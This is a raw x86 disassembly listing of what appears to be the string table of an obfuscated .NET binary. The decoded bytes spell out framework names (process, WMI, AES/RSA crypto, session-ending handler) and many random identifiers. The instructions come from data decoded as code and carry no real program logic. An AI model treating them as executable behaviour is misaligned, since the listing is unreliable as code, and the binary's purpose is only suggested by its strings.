  408e88:	6e                   	outsb  %ds:(%esi),(%dx)
  408e89:	61                   	popa
  408e8a:	67 65 6d             	gs insl (%dx),%es:(%di)
  408e8d:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e8f:	74 4f                	je     0x408ee0
  408e91:	62 6a 65             	bound  %ebp,0x65(%edx)
  408e94:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  408e98:	6c                   	insb   (%dx),%es:(%edi)
  408e99:	6c                   	insb   (%dx),%es:(%edi)
  408e9a:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408e9f:	6e                   	outsb  %ds:(%esi),(%dx)
  408ea0:	00 73 65             	add    %dh,0x65(%ebx)
  408ea3:	74 5f                	je     0x408f04
  408ea5:	50                   	push   %eax
  408ea6:	6f                   	outsl  %ds:(%esi),(%dx)
  408ea7:	73 69                	jae    0x408f12
  408ea9:	74 69                	je     0x408f14
  408eab:	6f                   	outsl  %ds:(%esi),(%dx)
  408eac:	6e                   	outsb  %ds:(%esi),(%dx)
  408ead:	00 43 72             	add    %al,0x72(%ebx)
  408eb0:	79 70                	jns    0x408f22
  408eb2:	74 6f                	je     0x408f23
  408eb4:	67 72 61             	addr16 jb 0x408f18
  408eb7:	70 68                	jo     0x408f21
  408eb9:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  408ec0:	74 69                	je     0x408f2b
  408ec2:	6f                   	outsl  %ds:(%esi),(%dx)
  408ec3:	6e                   	outsb  %ds:(%esi),(%dx)
  408ec4:	00 41 72             	add    %al,0x72(%ecx)
  408ec7:	67 75 6d             	addr16 jne 0x408f37
  408eca:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ecc:	74 4e                	je     0x408f1c
  408ece:	75 6c                	jne    0x408f3c
  408ed0:	6c                   	insb   (%dx),%es:(%edi)
  408ed1:	45                   	inc    %ebp
  408ed2:	78 63                	js     0x408f37
  408ed4:	65 70 74             	gs jo  0x408f4b
  408ed7:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408ede:	75 6d                	jne    0x408f4d
  408ee0:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ee2:	74 45                	je     0x408f29
  408ee4:	78 63                	js     0x408f49
  408ee6:	65 70 74             	gs jo  0x408f5d
  408ee9:	69 6f 6e 00 78 52 79 	imul   $0x79527800,0x6e(%edi),%ebp
  408ef0:	52                   	push   %edx
  408ef1:	73 49                	jae    0x408f3c
  408ef3:	61                   	popa
  408ef4:	58                   	pop    %eax
  408ef5:	74 63                	je     0x408f5a
  408ef7:	66 70 6e             	data16 jo 0x408f68
  408efa:	00 61 70             	add    %ah,0x70(%ecx)
  408efd:	69 42 4f 54 68 43 6b 	imul   $0x6b436854,0x4f(%edx),%eax
  408f04:	6c                   	insb   (%dx),%es:(%edi)
  408f05:	4d                   	dec    %ebp
  408f06:	70 4e                	jo     0x408f56
  408f08:	41                   	inc    %ecx
  408f09:	6f                   	outsl  %ds:(%esi),(%dx)
  408f0a:	00 73 65             	add    %dh,0x65(%ebx)
  408f0d:	57                   	push   %edi
  408f0e:	55                   	push   %ebp
  408f0f:	4a                   	dec    %edx
  408f10:	54                   	push   %esp
  408f11:	5a                   	pop    %edx
  408f12:	4a                   	dec    %edx
  408f13:	65 55                	gs push %ebp
  408f15:	59                   	pop    %ecx
  408f16:	42                   	inc    %edx
  408f17:	6f                   	outsl  %ds:(%esi),(%dx)
  408f18:	00 61 4f             	add    %ah,0x4f(%ecx)
  408f1b:	79 74                	jns    0x408f91
  408f1d:	68 59 70 4c 50       	push   $0x504c7059
  408f22:	53                   	push   %ebx
  408f23:	43                   	inc    %ebx
  408f24:	6f                   	outsl  %ds:(%esi),(%dx)
  408f25:	00 66 48             	add    %ah,0x48(%esi)
  408f28:	41                   	inc    %ecx
  408f29:	51                   	push   %ecx
  408f2a:	56                   	push   %esi
  408f2b:	55                   	push   %ebp
  408f2c:	78 79                	js     0x408fa7
  408f2e:	6a 58                	push   $0x58
  408f30:	6c                   	insb   (%dx),%es:(%edi)
  408f31:	48                   	dec    %eax
  408f32:	6f                   	outsl  %ds:(%esi),(%dx)
  408f33:	00 6e 49             	add    %ch,0x49(%esi)
  408f36:	71 57                	jno    0x408f8f
  408f38:	44                   	inc    %esp
  408f39:	73 6d                	jae    0x408fa8
  408f3b:	79 66                	jns    0x408fa3
  408f3d:	64 49                	fs dec %ecx
  408f3f:	4d                   	dec    %ebp
  408f40:	6f                   	outsl  %ds:(%esi),(%dx)
  408f41:	00 54 76 54          	add    %dl,0x54(%esi,%esi,2)
  408f45:	6e                   	outsb  %ds:(%esi),(%dx)
  408f46:	4e                   	dec    %esi
  408f47:	55                   	push   %ebp
  408f48:	66 70 62             	data16 jo 0x408fad
  408f4b:	74 4e                	je     0x408f9b
  408f4d:	6f                   	outsl  %ds:(%esi),(%dx)
  408f4e:	00 49 6d             	add    %cl,0x6d(%ecx)
  408f51:	61                   	popa
  408f52:	67 65 43             	addr16 gs inc %ebx
  408f55:	6f                   	outsl  %ds:(%esi),(%dx)
  408f56:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408f5b:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f5d:	00 46 69             	add    %al,0x69(%esi)
  408f60:	6c                   	insb   (%dx),%es:(%edi)
  408f61:	65 49                	gs dec %ecx
  408f63:	6e                   	outsb  %ds:(%esi),(%dx)
  408f64:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f66:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408f6a:	76 65                	jbe    0x408fd1
  408f6c:	49                   	dec    %ecx
  408f6d:	6e                   	outsb  %ds:(%esi),(%dx)
  408f6e:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f70:	00 46 69             	add    %al,0x69(%esi)
  408f73:	6c                   	insb   (%dx),%es:(%edi)
  408f74:	65 53                	gs push %ebx
  408f76:	79 73                	jns    0x408feb
  408f78:	74 65                	je     0x408fdf
  408f7a:	6d                   	insl   (%dx),%es:(%edi)
  408f7b:	49                   	dec    %ecx
  408f7c:	6e                   	outsb  %ds:(%esi),(%dx)
  408f7d:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f7f:	00 43 6f             	add    %al,0x6f(%ebx)
  408f82:	6d                   	insl   (%dx),%es:(%edi)
  408f83:	70 75                	jo     0x408ffa
  408f85:	74 65                	je     0x408fec
  408f87:	72 49                	jb     0x408fd2
  408f89:	6e                   	outsb  %ds:(%esi),(%dx)
  408f8a:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f8c:	00 43 53             	add    %al,0x53(%ebx)
  408f8f:	68 61 72 70 41       	push   $0x41707261
  408f94:	72 67                	jb     0x408ffd
  408f96:	75 6d                	jne    0x409005
  408f98:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f9a:	74 49                	je     0x408fe5
  408f9c:	6e                   	outsb  %ds:(%esi),(%dx)
  408f9d:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f9f:	00 73 65             	add    %dh,0x65(%ebx)
  408fa2:	74 5f                	je     0x409003
  408fa4:	53                   	push   %ebx
  408fa5:	74 61                	je     0x409008
  408fa7:	72 74                	jb     0x40901d
  408fa9:	49                   	dec    %ecx
  408faa:	6e                   	outsb  %ds:(%esi),(%dx)
  408fab:	66 6f                	outsw  %ds:(%esi),(%dx)
  408fad:	00 50 72             	add    %dl,0x72(%eax)
  408fb0:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb1:	63 65 73             	arpl   %esp,0x73(%ebp)
  408fb4:	73 53                	jae    0x409009
  408fb6:	74 61                	je     0x409019
  408fb8:	72 74                	jb     0x40902e
  408fba:	49                   	dec    %ecx
  408fbb:	6e                   	outsb  %ds:(%esi),(%dx)
  408fbc:	66 6f                	outsw  %ds:(%esi),(%dx)
  408fbe:	00 58 4e             	add    %bl,0x4e(%eax)
  408fc1:	62 65 66             	bound  %esp,0x66(%ebp)
  408fc4:	67 45                	addr16 inc %ebp
  408fc6:	6c                   	insb   (%dx),%es:(%edi)
  408fc7:	70 53                	jo     0x40901c
  408fc9:	47                   	inc    %edi
  408fca:	55                   	push   %ebp
  408fcb:	78 6f                	js     0x40903c
  408fcd:	00 52 48             	add    %dl,0x48(%edx)
  408fd0:	51                   	push   %ecx
  408fd1:	77 4a                	ja     0x40901d
  408fd3:	70 66                	jo     0x40903b
  408fd5:	79 48                	jns    0x40901f
  408fd7:	73 79                	jae    0x409052
  408fd9:	6f                   	outsl  %ds:(%esi),(%dx)
  408fda:	00 6d 62             	add    %ch,0x62(%ebp)
  408fdd:	6d                   	insl   (%dx),%es:(%edi)
  408fde:	54                   	push   %esp
  408fdf:	62 4f 6c             	bound  %ecx,0x6c(%edi)
  408fe2:	78 6b                	js     0x40904f
  408fe4:	72 66                	jb     0x40904c
  408fe6:	4c                   	dec    %esp
  408fe7:	6a 43                	push   $0x43
  408fe9:	70 00                	jo     0x408feb
  408feb:	59                   	pop    %ecx
  408fec:	4e                   	dec    %esi
  408fed:	70 6a                	jo     0x409059
  408fef:	62 68 4a             	bound  %ebp,0x4a(%eax)
  408ff2:	71 59                	jno    0x40904d
  408ff4:	4d                   	dec    %ebp
  408ff5:	70 00                	jo     0x408ff7
  408ff7:	44                   	inc    %esp
  408ff8:	67 65 44             	addr16 gs inc %esp
  408ffb:	74 63                	je     0x409060
  408ffd:	53                   	push   %ebx
  408ffe:	70 67                	jo     0x409067
  409000:	4d                   	dec    %ebp
  409001:	70 00                	jo     0x409003
  409003:	71 5a                	jno    0x40905f
  409005:	69 6e 65 54 50 42 48 	imul   $0x48425054,0x65(%esi),%ebp
  40900c:	59                   	pop    %ecx
  40900d:	71 64                	jno    0x409073
  40900f:	54                   	push   %esp
  409010:	70 00                	jo     0x409012
  409012:	6c                   	insb   (%dx),%es:(%edi)
  409013:	4a                   	dec    %edx
  409014:	4c                   	dec    %esp
  409015:	4d                   	dec    %ebp
  409016:	4a                   	dec    %edx
  409017:	42                   	inc    %edx
  409018:	52                   	push   %edx
  409019:	69 72 74 69 61 70 00 	imul   $0x706169,0x74(%edx),%esi
  409020:	53                   	push   %ebx
  409021:	6c                   	insb   (%dx),%es:(%edi)
  409022:	65 65 70 00          	gs gs jo 0x409026
  409026:	4d                   	dec    %ebp
  409027:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40902e:	74 2e                	je     0x40905e
  409030:	43                   	inc    %ebx
  409031:	53                   	push   %ebx
  409032:	68 61 72 70 00       	push   $0x707261
  409037:	6d                   	insl   (%dx),%es:(%edi)
  409038:	73 6c                	jae    0x4090a6
  40903a:	58                   	pop    %eax
  40903b:	6f                   	outsl  %ds:(%esi),(%dx)
  40903c:	59                   	pop    %ecx
  40903d:	4e                   	dec    %esi
  40903e:	58                   	pop    %eax
  40903f:	4a                   	dec    %edx
  409040:	42                   	inc    %edx
  409041:	63 75 70             	arpl   %esi,0x70(%ebp)
  409044:	00 46 72             	add    %al,0x72(%esi)
  409047:	58                   	pop    %eax
  409048:	53                   	push   %ebx
  409049:	71 62                	jno    0x4090ad
  40904b:	73 66                	jae    0x4090b3
  40904d:	75 70                	jne    0x4090bf
  40904f:	00 6c 64 61          	add    %ch,0x61(%esp,%eiz,2)
  409053:	6e                   	outsb  %ds:(%esi),(%dx)
  409054:	78 53                	js     0x4090a9
  409056:	45                   	inc    %ebp
  409057:	72 57                	jb     0x4090b0
  409059:	62 56 77             	bound  %edx,0x77(%esi)
  40905c:	70 00                	jo     0x40905e
  40905e:	77 6e                	ja     0x4090ce
  409060:	72 77                	jb     0x4090d9
  409062:	47                   	inc    %edi
  409063:	54                   	push   %esp
  409064:	42                   	inc    %edx
  409065:	67 78 70             	addr16 js 0x4090d8
  409068:	00 6c 4d 45          	add    %ch,0x45(%ebp,%ecx,2)
  40906c:	46                   	inc    %esi
  40906d:	54                   	push   %esp
  40906e:	4b                   	dec    %ebx
  40906f:	4c                   	dec    %esp
  409070:	41                   	inc    %ecx
  409071:	51                   	push   %ecx
  409072:	4f                   	dec    %edi
  409073:	71 00                	jno    0x409075
  409075:	50                   	push   %eax
  409076:	59                   	pop    %ecx
  409077:	4f                   	dec    %edi
  409078:	68 54 43 57 70       	push   $0x70574354
  40907d:	55                   	push   %ebp
  40907e:	51                   	push   %ecx
  40907f:	47                   	inc    %edi
  409080:	53                   	push   %ebx
  409081:	73 67                	jae    0x4090ea
  409083:	54                   	push   %esp
  409084:	71 00                	jno    0x409086
  409086:	6f                   	outsl  %ds:(%esi),(%dx)
  409087:	64 4c                	fs dec %esp
  409089:	49                   	dec    %ecx
  40908a:	52                   	push   %edx
  40908b:	79 53                	jns    0x4090e0
  40908d:	55                   	push   %ebp
  40908e:	4e                   	dec    %esi
  40908f:	51                   	push   %ecx
  409090:	63 6c 61 71          	arpl   %ebp,0x71(%ecx,%eiz,2)
  409094:	00 4d 58             	add    %cl,0x58(%ebp)
  409097:	75 46                	jne    0x4090df
  409099:	78 70                	js     0x40910b
  40909b:	72 62                	jb     0x4090ff
  40909d:	63 46 74             	arpl   %eax,0x74(%esi)
  4090a0:	66 69 71 00 53 79    	imul   $0x7953,0x0(%ecx),%si
  4090a6:	73 74                	jae    0x40911c
  4090a8:	65 6d                	gs insl (%dx),%es:(%edi)
  4090aa:	2e 4c                	cs dec %esp
  4090ac:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  4090b3:	61                   	popa
  4090b4:	72 00                	jb     0x4090b6
  4090b6:	43                   	inc    %ebx
  4090b7:	68 61 72 00 49       	push   $0x49007261
  4090bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4090bd:	76 6f                	jbe    0x40912e
  4090bf:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  4090c3:	6d                   	insl   (%dx),%es:(%edi)
  4090c4:	62 65 72             	bound  %esp,0x72(%ebp)
  4090c7:	00 4d 44             	add    %cl,0x44(%ebp)
  4090ca:	35 43 72 79 70       	xor    $0x70797243,%eax
  4090cf:	74 6f                	je     0x409140
  4090d1:	53                   	push   %ebx
  4090d2:	65 72 76             	gs jb  0x40914b
  4090d5:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4090dc:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  4090e3:	41 
  4090e4:	43                   	inc    %ebx
  4090e5:	72 79                	jb     0x409160
  4090e7:	70 74                	jo     0x40915d
  4090e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4090ea:	53                   	push   %ebx
  4090eb:	65 72 76             	gs jb  0x409164
  4090ee:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4090f5:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  4090fc:	73 
  4090fd:	43                   	inc    %ebx
  4090fe:	72 79                	jb     0x409179
  409100:	70 74                	jo     0x409176
  409102:	6f                   	outsl  %ds:(%esi),(%dx)
  409103:	53                   	push   %ebx
  409104:	65 72 76             	gs jb  0x40917d
  409107:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40910e:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  409115:	72 
  409116:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  40911d:	64 65 72 00          	fs gs jb 0x409121
  409121:	4d                   	dec    %ebp
  409122:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  409129:	74 2e                	je     0x409159
  40912b:	43                   	inc    %ebx
  40912c:	53                   	push   %ebx
  40912d:	68 61 72 70 2e       	push   $0x2e707261
  409132:	52                   	push   %edx
  409133:	75 6e                	jne    0x4091a3
  409135:	74 69                	je     0x4091a0
  409137:	6d                   	insl   (%dx),%es:(%edi)
  409138:	65 42                	gs inc %edx
  40913a:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  409141:	61                   	popa
  409142:	6c                   	insb   (%dx),%es:(%edi)
  409143:	6c                   	insb   (%dx),%es:(%edi)
  409144:	53                   	push   %ebx
  409145:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  40914c:	65 
  40914d:	72 00                	jb     0x40914f
  40914f:	67 65 74 5f          	addr16 gs je 0x4091b2
  409153:	42                   	inc    %edx
  409154:	75 66                	jne    0x4091bc
  409156:	66 65 72 00          	data16 gs jb 0x40915a
  40915a:	73 65                	jae    0x4091c1
  40915c:	74 5f                	je     0x4091bd
  40915e:	42                   	inc    %edx
  40915f:	75 66                	jne    0x4091c7
  409161:	66 65 72 00          	data16 gs jb 0x409165
  409165:	67 65 74 5f          	addr16 gs je 0x4091c8
  409169:	41                   	inc    %ecx
  40916a:	73 49                	jae    0x4091b5
  40916c:	6e                   	outsb  %ds:(%esi),(%dx)
  40916d:	74 65                	je     0x4091d4
  40916f:	67 65 72 00          	addr16 gs jb 0x409173
  409173:	73 65                	jae    0x4091da
  409175:	74 5f                	je     0x4091d6
  409177:	41                   	inc    %ecx
  409178:	73 49                	jae    0x4091c3
  40917a:	6e                   	outsb  %ds:(%esi),(%dx)
  40917b:	74 65                	je     0x4091e2
  40917d:	67 65 72 00          	addr16 gs jb 0x409181
  409181:	4d                   	dec    %ebp
  409182:	61                   	popa
  409183:	6e                   	outsb  %ds:(%esi),(%dx)
  409184:	61                   	popa
  409185:	67 65 6d             	gs insl (%dx),%es:(%di)
  409188:	65 6e                	outsb  %gs:(%esi),(%dx)
  40918a:	74 4f                	je     0x4091db
  40918c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40918f:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  409193:	61                   	popa
  409194:	72 63                	jb     0x4091f9
  409196:	68 65 72 00 53       	push   $0x53007265
  40919b:	65 73 73             	gs jae 0x409211
  40919e:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4091a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4091a6:	67 45                	addr16 inc %ebp
  4091a8:	76 65                	jbe    0x40920f
  4091aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4091ab:	74 48                	je     0x4091f5
  4091ad:	61                   	popa
  4091ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4091af:	64 6c                	fs insb (%dx),%es:(%edi)
  4091b1:	65 72 00             	gs jb  0x4091b4
  4091b4:	54                   	push   %esp
  4091b5:	69 6d 65 72 00 54 6f 	imul   $0x6f540072,0x65(%ebp),%ebp
  4091bc:	55                   	push   %ebp
  4091bd:	70 70                	jo     0x40922f
  4091bf:	65 72 00             	gs jb  0x4091c2
  4091c2:	43                   	inc    %ebx
  4091c3:	75 72                	jne    0x409237
  4091c5:	72 65                	jb     0x40922c
  4091c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4091c8:	74 55                	je     0x40921f
  4091ca:	73 65                	jae    0x409231
  4091cc:	72 00                	jb     0x4091ce
  4091ce:	53                   	push   %ebx
  4091cf:	74 72                	je     0x409243
  4091d1:	65 61                	gs popa
  4091d3:	6d                   	insl   (%dx),%es:(%edi)
  4091d4:	57                   	push   %edi
  4091d5:	72 69                	jb     0x409240
  4091d7:	74 65                	je     0x40923e
  4091d9:	72 00                	jb     0x4091db
  4091db:	54                   	push   %esp
  4091dc:	65 78 74             	gs js  0x409253
  4091df:	57                   	push   %edi
  4091e0:	72 69                	jb     0x40924b
  4091e2:	74 65                	je     0x409249
  4091e4:	72 00                	jb     0x4091e6
  4091e6:	45                   	inc    %ebp
  4091e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4091e8:	74 65                	je     0x40924f
  4091ea:	72 00                	jb     0x4091ec
  4091ec:	42                   	inc    %edx
  4091ed:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  4091f4:	72 
  4091f5:	74 65                	je     0x40925c
  4091f7:	72 00                	jb     0x4091f9
  4091f9:	54                   	push   %esp
  4091fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4091fb:	4c                   	dec    %esp
  4091fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4091fd:	77 65                	ja     0x409264
  4091ff:	72 00                	jb     0x409201
  409201:	62 67 58             	bound  %esp,0x58(%edi)
  409204:	4a                   	dec    %edx
  409205:	73 78                	jae    0x40927f
  409207:	68 52 6d 72 00       	push   $0x726d52
  40920c:	49                   	dec    %ecx
  40920d:	45                   	inc    %ebp
  40920e:	6e                   	outsb  %ds:(%esi),(%dx)
  40920f:	75 6d                	jne    0x40927e
  409211:	65 72 61             	gs jb  0x409275
  409214:	74 6f                	je     0x409285
  409216:	72 00                	jb     0x409218
  409218:	4d                   	dec    %ebp
  409219:	61                   	popa
  40921a:	6e                   	outsb  %ds:(%esi),(%dx)
  40921b:	61                   	popa
  40921c:	67 65 6d             	gs insl (%dx),%es:(%di)
  40921f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409221:	74 4f                	je     0x409272
  409223:	62 6a 65             	bound  %ebp,0x65(%edx)
  409226:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  40922a:	75 6d                	jne    0x409299
  40922c:	65 72 61             	gs jb  0x409290
  40922f:	74 6f                	je     0x4092a0
  409231:	72 00                	jb     0x409233
  409233:	53                   	push   %ebx
  409234:	79 73                	jns    0x4092a9
  409236:	74 65                	je     0x40929d
  409238:	6d                   	insl   (%dx),%es:(%edi)
  409239:	2e 43                	cs inc %ebx
  40923b:	6f                   	outsl  %ds:(%esi),(%dx)
  40923c:	6c                   	insb   (%dx),%es:(%edi)
  40923d:	6c                   	insb   (%dx),%es:(%edi)
  40923e:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409243:	6e                   	outsb  %ds:(%esi),(%dx)
  409244:	73 2e                	jae    0x409274
  409246:	49                   	dec    %ecx
  409247:	45                   	inc    %ebp
  409248:	6e                   	outsb  %ds:(%esi),(%dx)
  409249:	75 6d                	jne    0x4092b8
  40924b:	65 72 61             	gs jb  0x4092af
  40924e:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  409252:	47                   	inc    %edi
  409253:	65 74 45             	gs je  0x40929b
  409256:	6e                   	outsb  %ds:(%esi),(%dx)
  409257:	75 6d                	jne    0x4092c6
  409259:	65 72 61             	gs jb  0x4092bd
  40925c:	74 6f                	je     0x4092cd
  40925e:	72 00                	jb     0x409260
  409260:	41                   	inc    %ecx
  409261:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  409265:	61                   	popa
  409266:	74 6f                	je     0x4092d7
  409268:	72 00                	jb     0x40926a
  40926a:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40926f:	00 2e                	add    %ch,(%esi)
  409271:	63 63 74             	arpl   %esp,0x74(%ebx)
  409274:	6f                   	outsl  %ds:(%esi),(%dx)
  409275:	72 00                	jb     0x409277
  409277:	4d                   	dec    %ebp
  409278:	6f                   	outsl  %ds:(%esi),(%dx)
  409279:	6e                   	outsb  %ds:(%esi),(%dx)
  40927a:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  409281:	65 
  409282:	61                   	popa
  409283:	74 65                	je     0x4092ea
  409285:	44                   	inc    %esp
  409286:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40928a:	70 74                	jo     0x409300
  40928c:	6f                   	outsl  %ds:(%esi),(%dx)
  40928d:	72 00                	jb     0x40928f
  40928f:	43                   	inc    %ebx
  409290:	72 65                	jb     0x4092f7
  409292:	61                   	popa
  409293:	74 65                	je     0x4092fa
  409295:	45                   	inc    %ebp
  409296:	6e                   	outsb  %ds:(%esi),(%dx)
  409297:	63 72 79             	arpl   %esi,0x79(%edx)
  40929a:	70 74                	jo     0x409310
  40929c:	6f                   	outsl  %ds:(%esi),(%dx)
  40929d:	72 00                	jb     0x40929f
  40929f:	49                   	dec    %ecx
  4092a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4092a1:	74 50                	je     0x4092f3
  4092a3:	74 72                	je     0x409317
  4092a5:	00 73 75             	add    %dh,0x75(%ebx)
  4092a8:	6b 7a 6c 79          	imul   $0x79,0x6c(%edx),%edi
  4092ac:	79 6d                	jns    0x40931b
  4092ae:	51                   	push   %ecx
  4092af:	65 56                	gs push %esi
  4092b1:	47                   	inc    %edi
  4092b2:	73 00                	jae    0x4092b4
  4092b4:	48                   	dec    %eax
  4092b5:	4b                   	dec    %ebx
  4092b6:	4c                   	dec    %esp
  4092b7:	5a                   	pop    %edx
  4092b8:	4d                   	dec    %ebp
  4092b9:	6d                   	insl   (%dx),%es:(%edi)
  4092ba:	69 68 53 76 51 4c 71 	imul   $0x714c5176,0x53(%eax),%ebp
  4092c1:	46                   	inc    %esi
  4092c2:	4c                   	dec    %esp
  4092c3:	73 00                	jae    0x4092c5
  4092c5:	77 48                	ja     0x40930f
  4092c7:	48                   	dec    %eax
  4092c8:	6b 41 79 66          	imul   $0x66,0x79(%ecx),%eax
  4092cc:	4e                   	dec    %esi
  4092cd:	49                   	dec    %ecx
  4092ce:	4d                   	dec    %ebp
  4092cf:	73 00                	jae    0x4092d1
  4092d1:	55                   	push   %ebp
  4092d2:	59                   	pop    %ecx
  4092d3:	4a                   	dec    %edx
  4092d4:	65 76 43             	gs jbe 0x40931a
  4092d7:	4c                   	dec    %esp
  4092d8:	42                   	inc    %edx
  4092d9:	46                   	inc    %esi
  4092da:	4f                   	dec    %edi
  4092db:	4d                   	dec    %ebp
  4092dc:	4d                   	dec    %ebp
  4092dd:	73 00                	jae    0x4092df
  4092df:	56                   	push   %esi
  4092e0:	47                   	inc    %edi
  4092e1:	57                   	push   %edi
  4092e2:	6c                   	insb   (%dx),%es:(%edi)
  4092e3:	74 48                	je     0x40932d
  4092e5:	51                   	push   %ecx
  4092e6:	76 53                	jbe    0x40933b
  4092e8:	69 42 50 77 52 73 00 	imul   $0x735277,0x50(%edx),%eax
  4092ef:	53                   	push   %ebx
  4092f0:	79 73                	jns    0x409365
  4092f2:	74 65                	je     0x409359
  4092f4:	6d                   	insl   (%dx),%es:(%edi)
  4092f5:	2e 44                	cs inc %esp
  4092f7:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4092fe:	69 63 73 00 4d 69 63 	imul   $0x63694d00,0x73(%ebx),%esp
  409305:	72 6f                	jb     0x409376
  409307:	73 6f                	jae    0x409378
  409309:	66 74 2e             	data16 je 0x40933a
  40930c:	56                   	push   %esi
  40930d:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  409314:	73 69                	jae    0x40937f
  409316:	63 2e                	arpl   %ebp,(%esi)
  409318:	44                   	inc    %esp
  409319:	65 76 69             	gs jbe 0x409385
  40931c:	63 65 73             	arpl   %esp,0x73(%ebp)
  40931f:	00 53 79             	add    %dl,0x79(%ebx)
  409322:	73 74                	jae    0x409398
  409324:	65 6d                	gs insl (%dx),%es:(%edi)
  409326:	2e 52                	cs push %edx
  409328:	75 6e                	jne    0x409398
  40932a:	74 69                	je     0x409395
  40932c:	6d                   	insl   (%dx),%es:(%edi)
  40932d:	65 2e 49             	gs cs dec %ecx
  409330:	6e                   	outsb  %ds:(%esi),(%dx)
  409331:	74 65                	je     0x409398
  409333:	72 6f                	jb     0x4093a4
  409335:	70 53                	jo     0x40938a
  409337:	65 72 76             	gs jb  0x4093b0
  40933a:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  409341:	73 74                	jae    0x4093b7
  409343:	65 6d                	gs insl (%dx),%es:(%edi)
  409345:	2e 52                	cs push %edx
  409347:	75 6e                	jne    0x4093b7
  409349:	74 69                	je     0x4093b4
  40934b:	6d                   	insl   (%dx),%es:(%edi)
  40934c:	65 2e 43             	gs cs inc %ebx
  40934f:	6f                   	outsl  %ds:(%esi),(%dx)
  409350:	6d                   	insl   (%dx),%es:(%edi)
  409351:	70 69                	jo     0x4093bc
  409353:	6c                   	insb   (%dx),%es:(%edi)
  409354:	65 72 53             	gs jb  0x4093aa
  409357:	65 72 76             	gs jb  0x4093d0
  40935a:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  409361:	62 75 67             	bound  %esi,0x67(%ebp)
  409364:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  40936b:	65 
  40936c:	73 00                	jae    0x40936e
  40936e:	45                   	inc    %ebp
  40936f:	78 70                	js     0x4093e1
  409371:	61                   	popa
  409372:	6e                   	outsb  %ds:(%esi),(%dx)
  409373:	64 45                	fs inc %ebp
  409375:	6e                   	outsb  %ds:(%esi),(%dx)
  409376:	76 69                	jbe    0x4093e1
  409378:	72 6f                	jb     0x4093e9
  40937a:	6e                   	outsb  %ds:(%esi),(%dx)
  40937b:	6d                   	insl   (%dx),%es:(%edi)
  40937c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40937e:	74 56                	je     0x4093d6
  409380:	61                   	popa
  409381:	72 69                	jb     0x4093ec
  409383:	61                   	popa
  409384:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  409388:	00 47 65             	add    %al,0x65(%edi)
  40938b:	74 50                	je     0x4093dd
  40938d:	72 6f                	jb     0x4093fe
  40938f:	63 65 73             	arpl   %esp,0x73(%ebp)
  409392:	73 65                	jae    0x4093f9
  409394:	73 00                	jae    0x409396
  409396:	47                   	inc    %edi
  409397:	65 74 48             	gs je  0x4093e2
  40939a:	6f                   	outsl  %ds:(%esi),(%dx)
